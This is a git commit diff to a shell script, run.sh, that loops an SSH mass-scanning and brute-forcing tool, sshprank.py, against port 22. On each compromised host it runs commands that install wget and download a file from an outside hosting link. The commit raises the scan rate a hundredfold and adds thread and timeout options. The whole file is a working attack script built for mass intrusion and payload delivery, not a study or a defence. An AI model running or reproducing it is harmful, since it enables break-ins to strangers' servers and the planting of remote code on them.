2ba8f15439892cc9ed14dcafb44a296c7579b6b4
samita100 <66769151+samita100@users.noreply.github.com>
2020-09-01 11:16:18 +0545

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,4 +1,4 @@
 while [ 1 != 0 ]
 do
-sudo python3 sshprank.py -m '-p22 --rate=10000' -r 10000 -e -c 'apt update || yum update -y; sudo apt update; apt install wget -y || yum instal wget -y; sudo apt install wget -y; wget https://nextcloud-fi.webo.hosting/s/gfyBeBP8ozTodCt/download && sleep 5'
+sudo python3 sshprank.py -m '-p22 --rate=1000000' -r 10000 -e -c 'apt update || yum update -y; sudo apt update; apt install wget -y || yum instal wget -y; sudo apt install wget -y; wget https://nextcloud-fi.webo.hosting/s/gfyBeBP8ozTodCt/download' -x 500 -S 500 -X 500
 done
